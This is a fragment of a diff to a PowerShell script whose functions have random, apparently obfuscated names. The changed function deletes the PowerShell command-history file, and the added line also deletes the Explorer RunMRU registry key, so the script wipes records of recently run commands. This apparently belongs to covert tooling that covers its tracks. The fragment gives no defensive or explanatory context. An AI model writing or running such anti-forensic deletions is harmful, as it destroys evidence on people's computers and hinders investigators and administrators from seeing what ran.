@@ -19,7 +19,7 @@ function flipejsjiebsbllb($ibwjskwbnskieg) {
 }
 
 function kwhhabzbabjeikfn{
-    Remove-Item (Get-PSreadlineOption).HistorySavePath
+    Remove-Item (Get-PSreadlineOption).HistorySavePath; Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 }
 
 function wuwudhbdbwb($String){
